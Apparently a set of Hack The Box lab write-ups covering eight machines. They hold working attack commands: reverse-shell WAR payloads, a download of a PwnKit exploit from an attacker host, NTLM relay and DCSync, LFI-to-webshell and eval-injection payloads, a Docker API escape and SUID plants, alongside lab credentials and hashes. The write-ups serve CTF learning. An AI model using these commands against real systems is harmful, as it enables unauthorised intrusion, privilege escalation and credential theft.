Kotarak — HTB Writeup

htb linux hard ssrf tomcat pwnkit

Summary

Kotarak involves chaining a Server-Side Request Forgery (SSRF) vulnerability to discover a hidden internal service, recovering Tomcat manager credentials, and deploying a WAR-based reverse shell for initial access as tomcat. Privilege escalation exploits CVE-2021-4034 (PwnKit) via the unpatched kernel and SUID pkexec.

Reconnaissance

Nmap

$ nmap -sV -sC -Pn -p- 10.129.1.117
PortServiceVersion
22SSHOpenSSH 7.2p2 Ubuntu
8009AJP13Apache Jserv Protocol v1.3
8080HTTPApache Tomcat 8.5.5
60000HTTPApache httpd 2.4.18 (Ubuntu)

Four open ports. The non-standard port 60000 running a custom Apache app is the immediate priority. Port 8009 (AJP) and 8080 (Tomcat) are interesting secondary targets.

Initial Enumeration — Port 60000

Browsing to http://10.129.1.117:60000 reveals a page titled "Kotarak Web Hosting Private Browser" — a form that takes a URL as input and fetches it server-side.

Directory enumeration found /info.php — a full phpinfo() page with useful details: no open_basedir restriction, mod_status loaded, and cURL extension loaded (supports file://, gopher://, dict://).

SSRF Exploitation

The form submits to url.php?path=, which fetches the supplied URL via cURL and reflects the response. This is a confirmed SSRF.

Internal Port Scan

$ ffuf -u "http://10.129.1.117:60000/url.php?path=http://127.0.0.1:FUZZ" \
  -w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt \
  -fw 47
💡 Note
The SSRF wrapper always returns HTTP 200. Filtering by word count (-fw 47) rather than status code is required to cut through false positives, since Tomcat 404 error pages consistently return 47 words.

Results: Port 8080 — Apache Tomcat (994 bytes) and Port 3306 — MySQL banner (123 bytes).

Apache server-status — Discovering Port 888

phpinfo() confirmed mod_status was loaded. Apache's server-status page is restricted to localhost, but accessible via the SSRF:

http://10.129.1.117:60000/url.php?path=http://127.0.0.1:60000/server-status

The status table revealed multiple Apache workers serving requests to 127.0.0.1:888 — a service that never appeared in the nmap scan because it only listens on localhost.

Port 888 — Simple File Viewer

Accessing port 888 via SSRF returns a Simple File Viewer interface listing files including one named backup (2.22 kB). Fetching it revealed tomcat-users.xml with plaintext credentials:

<user username="admin" password="3@g01PdhB!"
  roles="manager,manager-gui,admin-gui,manager-script"/>

Initial Foothold — WAR Shell via Tomcat Manager

With valid credentials, a reverse shell WAR payload was generated and deployed:

$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 \
  -f war -o shell.war

$ curl -s -u 'admin:3@g01PdhB!' -T shell.war \
  'http://10.129.1.117:8080/manager/text/deploy?path=/shell'
💡 Note
The password contains ! — use single quotes in curl to prevent bash history expansion. 
$ nc -lvnp 4444
$ curl http://10.129.1.117:8080/shell/
[*] Command shell session 1 opened

Shell received as tomcat.

Privilege Escalation — CVE-2021-4034 (PwnKit)

The kernel version 4.4.0-83-generic (Ubuntu 16.04) is unpatched and vulnerable. /usr/bin/pkexec is present as a SUID binary.

Failed Attempt: CVE-2017-16995 (eBPF)

The eBPF verifier exploit was tried first but failed with: bpf_update_elem failed 'Argument list too long'.

💡 Note
Compiling on modern Kali without -static produces binaries requiring GLIBC_2.34, which the old target doesn't have. Always compile statically when targeting legacy systems. Also, /tmp is mounted with noexec on this box — use /dev/shm or /var/tmp instead.

Successful: PwnKit

PwnKit exploits a memory corruption bug in pkexec (PolicyKit). The Python version requires no compilation:

$ cd /dev/shm
$ wget http://<attacker_ip>/pwnkit.py
$ python pwnkit.py
Root shell obtained.
🏳 root.txt + user.txt captured.

Full Attack Chain

1. Recon — Nmap finds 4 ports: SSH (22), AJP (8009), Tomcat (8080), Apache (60000)
2. SSRF — Port 60000 has url.php?path= fetching arbitrary URLs server-side
3. Internal enumeration — ffuf through SSRF discovers MySQL (3306), confirms Tomcat (8080)
4. Hidden service — SSRF to server-status reveals localhost-only port 888
5. Credential recovery — Port 888 file viewer exposes tomcat-users.xml
6. Foothold — WAR reverse shell deployed via Tomcat manager
7. Privesc — Unpatched kernel + SUID pkexec → PwnKit (CVE-2021-4034) → root

Key Takeaways

  • SSRF is powerful — chaining SSRF through multiple internal services extracted credentials that weren't externally accessible
  • Filter by content, not status — SSRF wrappers return 200 for everything; word count filtering was essential
  • Old kernels = easy wins — always check uname -r early; pre-2022 systems with pkexec are almost certainly PwnKit-vulnerable
  • Static compilation — when targeting old systems from modern Kali, use gcc -static to avoid GLIBC version mismatches

Pirate — HTB Writeup

htb windows hard active-directory ntlm-relay spn-jacking gmsa

Summary

Pirate is a Windows Active Directory box featuring a two-machine environment: DC01 (domain controller) and WEB01 (ADFS server on an internal network). The attack chain involves discovering Pre-Windows 2000 machine account passwords, extracting gMSA credentials, NTLM relay with Resource-Based Constrained Delegation to compromise WEB01, and SPN Jacking to abuse constrained delegation and gain Domain Admin on DC01.

PropertyValue
Domainpirate.htb
DCDC01.pirate.htb (10.129.244.95)
ADFS/WebWEB01 (192.168.100.2 - internal)

Enumeration

Standard AD domain controller with IIS (port 80) and HTTPS (port 443). Initial credentials given in scope: pentest / p3nt3st2025!& (Domain Users, no special privileges).

BloodHound

$ bloodhound-python -u pentest -p 'p3nt3st2025!&' -d pirate.htb -ns 10.129.244.95 -c All --zip

BloodHound revealed the intended attack path:

a.white --ForceChangePassword--> a.white_adm --ConstrainedDeleg--> HTTP/WEB01

Key accounts: gMSA_ADFS_prod$ and gMSA_ADCS_prod$ — both in Remote Management Users (WinRM on DC01).

Foothold: Pre-Windows 2000 Machine Accounts

MS01$ and EXCH01$ are in the "Pre-Windows 2000 Compatible Access" group. These accounts have default passwords matching the lowercase machine name.

$ impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95

MS01$ is a member of "Domain Secure Servers" which grants ReadGMSAPassword rights.

gMSA Password Extraction

$ export KRB5CCNAME=MS01$.ccache
$ nxc ldap dc01.pirate.htb -k --use-kcache --gmsa
gMSA_ADFS_prod$  8126756fb2e69697bfcb04816e685839
gMSA_ADCS_prod$  304106f739822ea2ad8ebe23f802d078

Internal Network & ADFS

WinRM to DC01 revealed WEB01 (192.168.100.2) running ADFS. A ligolo-ng tunnel was established to reach it. The gMSA service account has full CRUD on all 52 WID tables, providing access to the entire ADFS configuration including the DKM key and encrypted token-signing certificate.

User Flag: NTLM Relay + RBCD on WEB01

WEB01 has SMB signing disabled, making it a relay target. The attack uses PetitPotam to coerce WEB01's machine account to authenticate, then relays to DC01 LDAP to set up RBCD.

$ ntlmrelayx.py -t ldap://10.129.244.95 --delegate-access --remove-mic -smb2support
$ python3 PetitPotam.py -u '' -p '' -d '' KALI_IP 192.168.100.2

ntlmrelayx creates computer account OLDWWINV$ and sets msDS-AllowedToActOnBehalfOfOtherIdentity on WEB01$.

$ impacket-getST 'pirate.htb/OLDWWINV$' -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator -dc-ip 10.129.244.95
$ impacket-secretsdump -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb

secretsdump revealed a.white's cleartext password stored as the DefaultPassword LSA secret (autologin):

DefaultPassword: PIRATE\a.white : E2nvAOKSz5Xz2MJu
🏳 user.txt captured via a.white on DC01

Root Flag: SPN Jacking to Domain Admin

With a.white's password, change a.white_adm's password via ForceChangePassword. a.white_adm is in the IT group, which has WriteProperty on servicePrincipalName for all computer accounts.

The SPN Jacking Attack

a.white_adm has constrained delegation configured to HTTP/WEB01. By moving that SPN from WEB01$ to DC01$, the KDC resolves S4U2Proxy requests to DC01$, encrypting the service ticket with DC01$'s key instead of WEB01$'s.

# Remove HTTP/WEB01 SPNs from WEB01$
# Add them to DC01$
# Then request a service ticket with altservice

$ impacket-getST 'pirate.htb/a.white_adm:Str0ngP@ss99' \
  -spn HTTP/WEB01.pirate.htb -impersonate Administrator \
  -altservice ldap/DC01.pirate.htb -dc-ip 10.129.244.95

DCSync

$ impacket-secretsdump -k -no-pass -dc-ip 10.129.244.95 pirate.htb/Administrator@DC01.pirate.htb
Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33071738496aba54a991ccc80875c97e:::
🏳 root.txt captured via Administrator pass-the-hash on DC01

Full Attack Chain

pentest (Domain Users)
  ↓ Enumerate Pre-Windows 2000 Compatible Access
MS01$ (pw: "ms01")
  ↓ Kerberos TGT → ReadGMSAPassword
gMSA_ADFS_prod$ (NT hash)
  ↓ WinRM on DC01+WEB01, WID database access, ligolo tunnel
  ↓ PetitPotam coerce WEB01 → ntlmrelayx → RBCD
Administrator on WEB01 (secretsdump → a.white cleartext)
  ↓ ForceChangePassword → a.white_adm
  ↓ WriteSPN on DC01$ → SPN Jacking
  ↓ S4U2Proxy -altservice ldap/DC01 → DCSync
Domain Admin on DC01

VariaType — HTB Writeup

htb linux medium fonttools fontforge setuptools cve-chain

Summary

VariaType chains three 2025 CVEs on a Debian 12 box running a Flask-based variable font generator:

fonttools arbitrary file write (www-data) → FontForge SFD pickle deserialization (steve) → setuptools path traversal (root)

Enumeration

Two ports open: SSH (22) and nginx (80). The main site at variatype.htb is a Flask application accepting .designspace and font uploads. VHost discovery found portal.variatype.htb with an exposed .git directory.

$ git-dumper http://portal.variatype.htb/.git/ git_dump/

Git history contained hardcoded credentials: gitbot / G1tB0t_Acc3ss_2025!

Foothold — CVE-2025-66034 (fonttools Arbitrary File Write)

fonttools 4.33.0 through 4.60.1 passes the <variable-font filename="..."> attribute directly to the output path with no sanitization. Combined with <labelname> CDATA surviving into the output, this gives arbitrary file write with content injection.

💡 Key Insight
Every PoC demonstrates relative path traversal (../). Python's os.path.join(output_dir, filename) discards the first argument entirely when filename starts with /. An absolute path bypasses both the ../ check and the /tmp/ sandbox.

A minimal TTF with a PHP webshell embedded in the familyName name record was created and paired with a malicious .designspace pointing the output to the portal's web root:

<variable-font name="TestFont-VF"
  filename="/var/www/portal.variatype.htb/public/files/shell.php">
$ curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Privesc: www-data → steve — CVE-2025-15276 (FontForge Pickle Deserialization)

A cron job runs FontForge on .sfd files in the portal's /files/ directory as user steve. FontForge's SFD parser calls Python's pickle.loads() on PickledData: fields — classic insecure deserialization.

A malicious .sfd file with a pickle __reduce__ payload was dropped via the webshell. The cron job executed it within ~5 minutes, providing a reverse shell as steve.

🏳 user.txt: d5a7aa6c197ae9053dfb81115a6401a0

Privesc: steve → root — CVE-2025-47273 (setuptools Path Traversal)

steve can run sudo /usr/bin/python3 /opt/font-tools/install_validator.py *. The script uses setuptools.package_index.PackageIndex().download() with setuptools 78.1.0, vulnerable to CVE-2025-47273.

The exploit uses %2f-encoded slashes in the URL path. After unquote() decodes them, os.path.join() treats the result as an absolute path:

$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.14.91:8000/%2froot%2f.ssh%2fauthorized_keys'
Plugin installed at: /root/.ssh/authorized_keys
$ ssh -i root_key root@10.129.5.78 'cat /root/root.txt'
1f118260bf378648b7b09fe63aea31be
🏳 root.txt: 1f118260bf378648b7b09fe63aea31be

Recurring Theme: os.path.join() Abuse

Two of three CVEs exploited the same Python behavior: os.path.join(base, user_input) discards base when user_input starts with /. When a PoC technique isn't working, go back to what the primitive actually gives you, not what the example shows.

Interpreter — HTB Writeup

htb linux medium mirth-connect cve-2023-43208 eval-injection

Summary

Interpreter runs Mirth Connect 4.4.0, a healthcare integration engine. Initial access via CVE-2023-43208 (pre-auth RCE exploiting XStream deserialization). Privilege escalation through a Python eval() injection in an internal Flask app that processes patient data.

Reconnaissance

$ nmap -sC -sV -Pn -p- 10.129.6.105
PortServiceVersion
22SSHOpenSSH 9.2p1 Debian
80HTTPJetty
443HTTPSJetty (SSL)
6661TCPMirth Connect MLLP Listener (HL7)

The Mirth Connect version is identifiable via an unauthenticated API: curl -k https://mirth-connect/api/server/version returns 4.4.0.

Initial Access — CVE-2023-43208 (Pre-Auth RCE)

Mirth Connect 4.4.0 is vulnerable to pre-auth RCE via XStream deserialization on the /api/users endpoint. Java's Runtime.exec() does not support shell redirections, so the reverse shell command must be base64-encoded and wrapped in brace expansion:

$ python3 CVE-2023-43208.py -u https://mirth-connect \
  -c "bash -c {echo,YmFzaC...}|{base64,-d}|{bash,-i}"

Shell received as the mirth user.

Post-Exploitation — MySQL Enumeration

The Mirth properties file contains database credentials: mirthdb / MirthPass123!. The CHANNEL table reveals the integration pipeline:

  • Source: Port 6661 (TCP/MLLP) receives HL7v2 messages
  • Transformer: Converts HL7 → XML (patient data extraction)
  • Destination: POSTs XML to http://127.0.0.1:54321/addPatient

This exposes a hidden internal Flask application running on port 54321 as root.

Privilege Escalation — Python eval() Injection

The Flask app processes patient XML fields through Python's eval(). Curly braces {} are stripped (not blocked) — the content inside braces is evaluated. The box name "Interpreter" is the hint.

Sending {7+7} in the firstname field returns 14, confirming server-side evaluation.

# Read files as root
{open('/root/root.txt').read()}
{open('/home/sedric/user.txt').read()}

# Command execution as root
{__import__('os').popen('id').read()}
🏳 Both flags captured via eval injection.

Key Takeaways

  • Enumerate databases thoroughly — the Mirth CHANNEL table was the pivot point that revealed the internal Flask service
  • Internal services running as root are high-value targets — the Flask app wasn't externally accessible but ran with root privileges
  • Stripping vs. blocking input — the app stripped curly braces instead of rejecting the input, allowing content to reach eval()

MonitorsFour — HTB Writeup

htb windows medium php-type-juggling cacti docker-escape

Summary

MonitorsFour chains PHP type juggling for credential extraction, Cacti authenticated RCE (CVE-2025-24367), and a Docker Desktop container escape (CVE-2025-9074) via an exposed Docker Engine API.

Reconnaissance

Only port 80 open (nginx). VHost enumeration discovers cacti.monitorsfour.htb. Directory enumeration finds an exposed .env with database credentials and a /user API endpoint returning {"error":"Missing token parameter"}.

PHP Type Juggling Exploitation

PHP's loose comparison (==) treats strings starting with 0e followed by digits as scientific notation (0 × 10^n = 0). One user's token matches the 0e[0-9]+ pattern:

$ curl "http://monitorsfour.htb/user?token=0"
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb",
  "password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user",...}]

Full database dump. MD5 hash cracked with hashcat: admin:wonderful1.

Cacti RCE — CVE-2025-24367

Cacti 1.2.28 is vulnerable to authenticated RCE via graph template injection. Unsanitized newline characters in the right_axis_label field allow injection of rrdtool commands that create arbitrary PHP files in the web root.

$ python3 cve_2025_24367.py -u marcus -p wonderful1 -i <ATTACKER_IP> -l 4444 \
  -url http://cacti.monitorsfour.htb

Reverse shell as www-data — inside a Docker container.

Docker Container Escape — CVE-2025-9074

Database changelog reveals the host is Windows + Docker Desktop 4.44.2. Versions < 4.44.3 expose an unauthenticated Docker Engine API at 192.168.65.7:2375 accessible from containers.

$ curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/host_root/Users/Administrator/Desktop/root.txt"],
     "HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}'
$ curl -s -X POST http://192.168.65.7:2375/containers/<id>/start
$ curl -s http://192.168.65.7:2375/containers/<id>/logs?stdout=true
🏳 Both flags captured via container escape to host filesystem.

Key Takeaways

  • Always test type juggling — token=0, token[]=1, {"token":true} on auth endpoints
  • Application changelogs are goldmines — revealed Windows host + Docker Desktop version
  • Container escape vectors — always check Docker socket mount, internal Docker API (192.168.65.7:2375 for Desktop), kernel exploits

Pterodactyl — HTB Writeup

htb linux medium pterodactyl-panel lfi pam-bypass cve-2025-49132

Summary

Pterodactyl runs the Pterodactyl game server management panel on openSUSE Leap 15.6. Initial access via CVE-2025-49132 (unauthenticated LFI chained with PHP PEAR's pearcmd.php for RCE). Root via CVE-2025-6018 (PAM session bypass) + CVE-2025-6019 (libblockdev/udisks2 nosuid mount bypass).

Reconnaissance

Two ports: SSH (22) and nginx (80) redirecting to pterodactyl.htb. Key information disclosure findings:

  • phpinfo.php — register_argc_argv=On, empty disable_functions, PEAR in include path
  • changelog.txt — Pterodactyl Panel v1.11.10, PHP-PEAR enabled

panel.pterodactyl.htb confirmed as the Pterodactyl Panel (Laravel/React SPA).

Foothold — CVE-2025-49132: LFI to RCE

The /locales/locale.json endpoint passes locale and namespace params directly to PHP's include() without auth. When register_argc_argv is enabled, PEAR's pearcmd.php reads arguments from the query string.

# Write webshell via PEAR config-create
$ curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin('6964'))?>+/tmp/shell.php"

# Include the webshell
$ curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=shell"

Shell as wwwrun. User flag world-readable.

Privesc: wwwrun → phileasfogg3

Panel database query revealed bcrypt hashes. phileasfogg3's hash cracked to !QAZ2wsx (keyboard-walk pattern), reused for SSH.

Privesc: Root — CVE-2025-6018 + CVE-2025-6019

PAM Session Bypass

openSUSE's PAM reads ~/.pam_environment with user_readenv=1. Injecting environment variables tricks systemd-logind into marking the session as "physically present":

$ cat > ~/.pam_environment << 'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
EOF

After re-login, loginctl shows Active=yes — polkit allow_active actions are now available without a password.

libblockdev nosuid Mount Bypass

An XFS image containing a SUID root bash was created. Using udisks2 Filesystem.Resize on a loop device, libblockdev temporarily mounts the image without nosuid. A Python race condition catcher monitors /proc/mounts and executes the SUID bash when the mount appears:

$ python3 catcher.py
[!!!] HIT at /tmp/blockdev.EOYYL3
bash-4.4# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root)
🏳 root.txt: 23a028f57158b735838c675007307f8d

Key Takeaways

  • Information disclosure compounds — phpinfo.php + changelog.txt turned a "maybe" into a "definitely"
  • SUSE backports patches — always check rpm -q --changelog rather than trusting version strings
  • Process management in race conditions — the catcher must run in the foreground so os.execv replaces a process you can interact with

CCTV — HTB Writeup

htb linux easy zoneminder docker credential-capture

Summary

CCTV runs ZoneMinder with default credentials. The attack chain: JWT forgery for superadmin access, RCE via ZM filter commands, discovering a hidden Docker container network, capturing plaintext credentials via tcpdump on the bridge interface, and a deferred MotionEye root plant that fires while you're working another path.

ZoneMinder — Default Creds + JWT Forgery

admin:admin worked out of the box. The JWT secret was the unchanged default: "...Change me to something unique...". Forged a superadmin JWT and reset the superadmin password to SuperAdmin123!.

RCE as www-data

ZoneMinder's filter feature runs a shell command every 10s via the zmfilter daemon. Injected a command into filter[AutoExecuteCmd] as superadmin, writing a PHP webshell:

$ curl -s --get 'http://cctv.htb/zm/cache/s.php' --data-urlencode 'c=COMMAND'

Background Plant — MotionEye

MotionEye runs as root (systemd User=root). Modified on_event_start in the camera config to create a SUID bash: cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash. Enabled emulate_motion=on so every frame triggers detection.

The plant appeared to fail — /tmp/rootbash didn't appear immediately. Pivoted away to work another path.

Discovering the Hidden Container Network

ip addr revealed two Docker bridge networks. Ping sweep found 172.25.0.10 alive. Server logs showed a custom management service being polled every ~40s: "Authorization as sa_mark successful. Command issued: disk-info".

Capturing sa_mark's Password — tcpdump on the Bridge

www-data had cap_net_raw capability (tcpdump without root). Within 40 seconds of listening on the Docker bridge:

$ tcpdump -i br-1b6b4b93c636 -A host 172.25.0.10
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info

Custom management service, no TLS, credentials in the clear.

$ ssh sa_mark@10.129.1.155
# Password: X1l9fx1ZjS7RZb
🏳 user.txt captured via SSH as sa_mark

The Deferred Plant Pays Off

While running SUID enumeration as sa_mark, found /tmp/rootbash in the list. The MotionEye on_event_start command had fired in the background while we were busy on the tcpdump path.

$ /tmp/rootbash -p -c "id; cat /root/root.txt"
uid=1001(sa_mark) gid=1001(sa_mark) euid=0(root)
🏳 root.txt: 84ed643f67f25213efa9e9014d24830a

Key Lesson — Pivot, Don't Wait

The MotionEye root plant was set up and appeared to fail. Instead of sitting and retrying, we pivoted to the tcpdump/credential path. The plant continued running in the background and delivered root by the time we got user. Two parallel attack paths, one lands while you're working the other.

Facts — HTB Writeup

htb linux easy camaleon-cms s3 facter

Summary

Facts runs CamaleonCMS 2.9.0 with open user registration and MinIO object storage. The attack chain: path traversal (CVE-2024-46987) for arbitrary file read, mass assignment (CVE-2025-2304) for CMS admin, S3 credential extraction from the application database, SSH key cracking, and privilege escalation via sudo facter with custom Ruby facts.

Reconnaissance

PortServiceVersion
22SSHOpenSSH 9.9p1
80HTTPnginx 1.26.3 → CamaleonCMS
54321HTTPMinIO S3 API

Key finding: CamaleonCMS has open user registration at /admin/register. Every known CVE requires authenticated access — the moment registration is enabled, they all become unauthenticated attack paths.

CVE-2024-46987 — Path Traversal

$ curl "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd"

Extracted the Rails database config (SQLite3), master.key, and the production database. The CMS cama_metas table contained S3 credentials in cleartext:

"filesystem_s3_access_key": "AKIA1F2BD38BAB3EADE7"
"filesystem_s3_secret_key": "KKHqSdHmMeAkiIryZZaSbTyTH92t7Zb7XWB31g9q"

MinIO Bucket Enumeration

$ mc alias set facts http://10.129.6.121:54321 AKIA1F2BD38BAB3EADE7 KKHqSdHmMeAkiIryZZaSbTyTH92t7Zb7XWB31g9q

Privilege Escalation — sudo facter

Facter is a Ruby-based system profiling tool from the Puppet ecosystem. The --custom-dir flag loads arbitrary Ruby files — running it with sudo is equivalent to root shell access.

$ mkdir -p /tmp/facts
$ cat > /tmp/facts/pwn.rb << 'EOF'
Facter.add(:pwn) do
  setcode do
    Facter::Core::Execution.execute("cat /root/root.txt")
  end
end
EOF

$ sudo /usr/bin/facter --custom-dir /tmp/facts pwn
6af031dd9e664c8e9ec6383ba8308a2e
🏳 root.txt: 6af031dd9e664c8e9ec6383ba8308a2e

Key Takeaways

  • Open registration + authenticated CVEs = unauthenticated attack — always check /admin/register, /signup on any CMS
  • Application databases store more than user creds — CMS platforms routinely store cloud provider credentials and API keys
  • Ruby-based tools with sudo are root — Facter, IRB, Rails console — any tool that evaluates Ruby code grants full execution
